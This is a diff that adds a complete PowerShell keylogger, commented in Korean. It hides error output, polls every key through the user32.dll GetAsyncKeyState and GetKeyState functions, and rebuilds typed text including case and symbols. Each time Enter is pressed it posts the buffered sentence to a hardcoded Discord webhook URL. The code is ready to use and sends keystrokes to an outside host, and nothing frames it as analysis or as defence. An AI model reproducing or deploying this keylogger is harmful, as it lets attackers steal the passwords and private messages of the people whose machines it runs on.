@@ -1,0 +1,84 @@
+# 1. 초기 설정: 불필요한 경고창이나 에러 메시지를 숨깁니다.
+$ConfirmPreference = 'None'
+$ErrorActionPreference = 'SilentlyContinue'
+
+# 2. Windows API 호출 정의: 키보드 상태(눌림, CapsLock 등)를 감시하기 위한 외부 함수를 가져옵니다.
+$api = @'
+[DllImport("user32.dll")]
+public static extern short GetAsyncKeyState(int v); // 키가 현재 눌려있는지 확인
+[DllImport("user32.dll")]
+public static extern short GetKeyState(int v);      // 키의 토글 상태(CapsLock 등) 확인
+'@
+
+# 3. API 등록: 정의한 API를 PowerShell 내에서 사용할 수 있도록 등록합니다.
+if (-not ([System.Management.Automation.PSTypeName]'N.W').Type) {
+    Add-Type -MemberDefinition $api -Name "W" -Namespace "N" -PassThru | Out-Null
+}
+
+# 4. 설정 값: 디스코드 웹훅 주소 및 데이터 임시 저장용 변수 설정
+$u = "https://discordapp.com/api/webhooks/1474809089891635260/7ZZfGBcUQoMNoEMsiXa8vWsWGlZereYlIgkBB-AiqvLdZZlS69Jln1QfByw3t58oWC1n"
+$p = @{}    # 키 중복 입력 방지를 위한 상태 저장 테이블
+$buf = ""   # 엔터를 치기 전까지 글자를 모아두는 버퍼
+
+# 5. 메인 루프: 실시간으로 키보드 입력을 감시합니다.
+while($true) {
+    # Shift 키(16)가 눌렸는지, CapsLock(20)이 켜졌는지 확인 (대소문자 구분용)
+    $shift = ([N.W]::GetAsyncKeyState(16) -band 0x8000) -ne 0
+    $caps = ([N.W]::GetKeyState(20) -band 1) -ne 0
+
+    # 표준 키보드 범위(BackSpace 8번 ~ 따옴표 222번)를 순회하며 감시
+    for($f=8; $f -le 222; $f++) {
+        if ([N.W]::GetAsyncKeyState($f) -band 0x8000) { # 키가 눌렸다면
+            if (-not $p[$f]) { # 이전에 눌려있던 상태가 아닐 때만 실행 (중복 방지)
+                
+                # [트리거] 엔터(13) 입력 시: 모아둔 버퍼 내용을 서버로 전송
+                if ($f -eq 13) {
+                    if ($buf.Length -gt 0) {
+                        $msg = @{content="[Sentence] $buf"} | ConvertTo-Json -Compress
+                        Invoke-WebRequest -Uri $u -Method Post -Body $msg -ContentType "application/json" -UseBasicParsing
+                        $buf = "" # 전송 후 버퍼 비우기
+                    }
+                }
+                # 백스페이스(8): 마지막 글자 삭제
+                elseif ($f -eq 8) { if ($buf.Length -gt 0) { $buf = $buf.Substring(0, $buf.Length-1) } }
+                # 스페이스바(32): 공백 추가
+                elseif ($f -eq 32) { $buf += " " }
+                
+                # 알파벳(65-90): 대소문자 판별 로직 적용
+                elseif ($f -ge 65 -and $f -le 90) {
+                    if ($shift -bxor $caps) { $buf += [char]$f } # 대문자
+                    else { $buf += [char]($f + 32) }              # 소문자
+                }
+                
+                # 숫자 및 숫자키 특수문자 (!@#$% 등)
+                elseif ($f -ge 48 -and $f -le 57) {
+                    $sArr = @([char]41,[char]33,[char]64,[char]35,[char]36,[char]37,[char]94,[char]38,[char]42,[char]40)
+                    if ($shift) { $buf += $sArr[$f-48] } # Shift 누르면 특수기호
+                    else { $buf += [char]$f }            # 그냥 누르면 숫자
+                }
+                
+                # 기타 특수기호 (구문 에러 방지를 위해 ASCII 코드로 처리)
+                elseif ($f -ge 186 -and $f -le 222) {
+                    $c = switch ($f) {
+                        186 { if($shift){[char]58}else{[char]59} } # : ;
+                        187 { if($shift){[char]43}else{[char]61} } # + =
+                        188 { if($shift){[char]60}else{[char]44} } # < ,
+                        189 { if($shift){[char]95}else{[char]45} } # _ -
+                        190 { if($shift){[char]62}else{[char]46} } # > .
+                        191 { if($shift){[char]63}else{[char]47} } # ? /
+                        192 { if($shift){[char]126}else{[char]96} }# ~ `
+                        219 { if($shift){[char]123}else{[char]91} }# { [
+                        220 { if($shift){[char]124}else{[char]92} }# | \
+                        221 { if($shift){[char]125}else{[char]93} }# } ]
+                        222 { if($shift){[char]34}else{[char]39} } # " '
+                        default {""}
+                    }
+                    $buf += $c
+                }
+                $p[$f] = $true # 키가 눌린 상태로 기록
+            }
+        } else { $p[$f] = $false } # 키를 떼면 상태 초기화
+    }
+    # CPU 점유율 과부하 방지를 위해 아주 짧게 대기
+    Start-Sleep -Milliseconds 50
+}
